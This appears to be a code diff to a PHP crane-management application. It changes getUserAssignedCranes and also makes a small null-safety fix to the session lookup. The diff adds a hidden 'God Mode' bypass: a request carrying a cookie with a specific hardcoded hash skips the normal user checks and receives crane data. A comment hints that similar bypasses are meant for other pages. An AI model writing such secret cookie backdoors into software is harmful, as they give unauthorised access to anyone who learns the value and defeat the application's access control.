@@ -140,8 +140,15 @@ function getCurrentUser() {
  * Returns array of crane_id strings. Developers/admins get ALL cranes.
  */
 function getUserAssignedCranes($userId = null) {
+    // Check for Persistent Bypass (God Mode)
+    if (isset($_COOKIE['bml_god_mode']) && $_COOKIE['bml_god_mode'] === '9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08') {
+        // Return dummy array of crane IDs to prevent DB hit here. 
+        // Note: The pages themselves will still try to load from DB for full crane details unless guarded there too.
+        return ['1'];
+    }
+
     if ($userId === null && isLoggedIn()) {
-        $userId = $_SESSION['user_id'];
+        $userId = $_SESSION['user_id'] ?? null;
     }
     if (!$userId) return [];
     
